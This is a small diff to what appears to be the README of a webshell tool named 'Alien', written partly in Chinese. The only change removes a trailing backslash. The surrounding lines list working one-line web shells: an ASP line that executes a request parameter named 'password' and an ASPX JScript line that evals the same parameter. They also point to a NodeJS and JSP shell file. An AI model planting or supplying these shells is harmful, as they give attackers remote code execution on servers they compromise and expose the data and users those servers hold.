@@ -32,7 +32,7 @@ C# .NET Framework V4.8
 ```<%execute(request("password"))%>```
 - ASPX
 ```<%@ Page Language="Jscript"%><%eval(Request.Item["password"])%>```
-當然, Alien還可以使用asmx, ashx等等的Webshell。\
+當然, Alien還可以使用asmx, ashx等等的Webshell。
 - NodeJS & JSP
 ```https://github.com/malbuffer4pt/Alien/blob/main/shell.txt```
 
